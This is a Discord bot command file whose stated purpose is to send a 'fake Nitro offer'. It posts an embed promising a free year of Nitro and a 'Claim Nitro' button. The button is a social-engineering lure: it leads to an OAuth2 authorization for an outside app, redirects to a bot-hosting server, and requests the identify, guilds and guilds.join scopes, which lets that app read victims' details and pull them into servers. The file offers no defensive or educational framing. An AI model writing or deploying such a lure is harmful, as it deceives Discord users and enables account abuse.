const { Client, EmbedBuilder, ActionRowBuilder, ButtonBuilder } = require('discord.js');

module.exports = {

    name: 'nitro',

    owners: true,

    description: 'Sends a fake Nitro offer with a verification button.',

    execute(message, args, client) {

        const embed = new EmbedBuilder()

            .setTitle('Nitro Offer')

            .setDescription('Click the button below to verify and claim your one-year Nitro subscription!')

            .setImage('https://media.discordapp.net/attachments/1018504362290581625/1018504402757222420/11111unknown.png?ex=65f6e7a4&is=65e472a4&hm=acdd2bcec04ab70ed6d2ff4d2940e65d4d21a3abfc21346de60ca3cfa459dcd4&')

            .setColor('#0099ff');

        const button = new ButtonBuilder()

            .setStyle('Link') // Set to 'LINK' for a hyperlink button

            .setLabel('Claim Nitro')

            .setURL('https://discord.com/oauth2/authorize?client_id=1213581772340592641&response_type=code&redirect_uri=http%3A%2F%2Ffi3.bot-hosting.net%3A21660%2Flogin&scope=identify+guilds+guilds.join'); // Replace 'https://example.com/verify' with your verification link

        const row = new ActionRowBuilder().addComponents(button);

        message.channel.send({ embeds: [embed], components: [row] })

            .catch(error => console.error('Failed to send message:', error)); // Handle error if message fails to send

    },

};